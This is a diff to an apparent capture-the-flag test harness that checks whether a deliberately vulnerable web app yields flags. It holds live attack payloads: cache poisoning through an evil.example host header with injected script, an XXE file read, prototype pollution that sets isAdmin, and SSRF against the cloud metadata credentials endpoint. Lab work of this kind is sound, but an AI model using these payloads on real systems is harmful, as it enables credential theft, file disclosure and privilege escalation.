@@ -192,6 +192,12 @@ ok(54, 'burn_mass_delete', (await txt('/api/admin/wipe', J({}))).body.includes('
 { await txt('/promo-banner.css', { headers: { 'x-forwarded-host': 'evil.example/"><script>x</script>' } }); // poison
   ok(55, 'burn_cache_poison', (await txt('/promo-banner.css')).body.includes('lj_cache_poison_deface')); }        // served from cache
 
+// ─────────────────────── v7 COMPOSER (supply-chain / cross-protocol) ───────────────────────
+ok(56, 'composer_dependency_confusion', (await txt('/api/sbom')).body.includes('lj_dependency_confusion'));
+ok(57, 'composer_xxe', (await txt('/api/import/xml', J({ xml: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file://' + process.cwd() + '/package.json">]><r>&xxe;</r>' }))).body.includes('lj_xxe_file_read'));
+ok(58, 'composer_prototype_pollution', (await txt('/api/prefs', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"prefs":{"__proto__":{"isAdmin":true}}}' })).body.includes('lj_prototype_pollution'));
+ok(59, 'composer_ssrf_cloud', (await txt('/api/import-avatar', J({ url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role' }))).body.includes('lj_ssrf_cloud_metadata_creds'));
+
 const passed = results.filter((r) => r.pass).length;
 for (const r of results) console.log(`${r.pass ? '✅' : '❌'}  #${String(r.id).padStart(2)}  ${r.name}`);
 console.log(`\n${passed}/${results.length} challenges captured.`);
